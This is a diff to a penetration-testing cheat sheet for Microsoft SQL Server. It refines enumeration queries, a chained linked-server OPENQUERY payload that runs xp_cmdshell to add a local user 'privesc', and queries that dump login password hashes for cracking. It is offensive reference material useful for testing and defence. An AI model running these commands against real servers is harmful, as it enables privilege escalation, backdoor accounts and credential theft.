@@ -592,15 +592,16 @@ Manual checks:
 
 • SQL basic/usefull queries:
 
-  SQL> SELECT SYSTEM_USER;		  //Display the current user
-  SQL> SELECT @@version;		  //Display the database server version
-  SQL> exec xp_loginconfig;		  //Display login security configuration of MSQL Server
-  SQL> SELECT * FROM sys.syslogins	  //List of the accounts (Win and SQL)
-  SQL> SELECT * FROM sys.sql_logins;	  //Password hashes of the SQL account, account status...
-  SQL> SELECT * from sys.databases;	  //List the databases
-  SQL> SELECT * from sys.configurations;  //List various usefull configuration settings
-  SQL> SELECT * from sysoledbusers;	  //Contains one row for each user and password mapping for the specified linked server
-  SQL> SELECT HOST_NAME();		  //Display the Hostname and the IP address(es)
+  SQL> SELECT SYSTEM_USER;		    //Display the current user name
+  SQL> SELECT @@version;		    //Display the database server version
+  SQL> exec xp_loginconfig;		    //Display the login security configuration of an instance of SQL Server
+  SQL> SELECT * FROM sys.syslogins	    //Display the list of accounts (Windows & SQL) and if they have server roles (e.g. sysadmin, securityadmin, bulkadmin, ...)
+  SQL> SELECT * FROM sys.server_permissions //Display the current user permissions (e.g. CONNECT SQL, VIEW ANY DATABASE, CONTROL SERVER) 
+  SQL> SELECT * FROM sys.sql_logins;	    //Display the password hashes of the SQL accounts, the account status, ...
+  SQL> SELECT * from sys.databases;	    //List the databases
+  SQL> SELECT * from sys.configurations;    //List various usefull configuration settings
+  SQL> SELECT * from sysoledbusers;	    //Contains one row for each user and password mapping for the specified linked server
+  SQL> SELECT HOST_NAME();		    //Display the hostname
  
   SQL> use <db name>; exec sp_helprolemember; //Display the list of accounts which have the roles "db_owner", "db_datawriter" and "db_datareader" for the Db name.
   SQL> use master; exec sp_helprolemember; 
@@ -1135,7 +1136,7 @@ Scenario: we add our db account into a high privileged role...privesc
 	SQL> SELECT * FROM [SQLSRVPROD01\INSTANCE01].Database_name.Schema_name.Table_name;
 	
 	SQL> SELECT * FROM openquery("DB-Linked-Instance1",'select * from master..sysservers');
-	SQL> SELECT * FROM openquery("DB-Linked-Instance1",'select * from master..syslogin');
+	SQL> SELECT * FROM openquery("DB-Linked-Instance1",'select * from master..syslogins');
 	
 	SQL> SELECT * FROM OPENQUERY("DB-Linked-Instance1", 'SELECT * FROM OPENQUERY("DB-Linked-Instance2", ''SELECT * FROM OPENQUERY("DB-Linked-Instance3", ''''SELECT @@Servername'''')'')') 
 	SQL> SELECT * FROM OPENQUERY("DB-Linked-Instance1", 'SELECT * FROM OPENQUERY("DB-Linked-Instance2", ''SELECT * FROM OPENQUERY("DB-Linked-Instance3", ''''SELECT 1;EXEC master..xp_cmdshell ''''''''net user privesc Privesc1! /add'''''''''''')'')') 
@@ -1478,9 +1479,12 @@ Step 3 - Use tool "METASPLOIT" or "RESPONDER" to start a SMB rogue authenticatio
 08. How to dump and crack MSSQL password hashes
 ============================================================================================================
 
-1. Manual MSSQL (SQL) Password hashes dump
+1. Manual MSSQL (SQL) password hashes dump
 ===========================================
-SQL> SELECT name, password, LOGINPROPERTY(name, 'PasswordHash' ) hash FROM syslogins WHERE password IS NOT NULL; 	-- Test on SQL Server 2012
+SQL> SELECT * FROM sys.sql_logins;  --Display the password hashes of the SQL accounts (SQL Server 2008/2012/2016/2019)
+
+Other usefull queries:
+SQL> SELECT name, password, LOGINPROPERTY(name, 'PasswordHash' ) hash FROM syslogins WHERE password IS NOT NULL; 
 SQL> SELECT name from sys.sql_logins union all select master.dbo.fn_varbintohexstr(password_hash)from sys.sql_logins
 
 
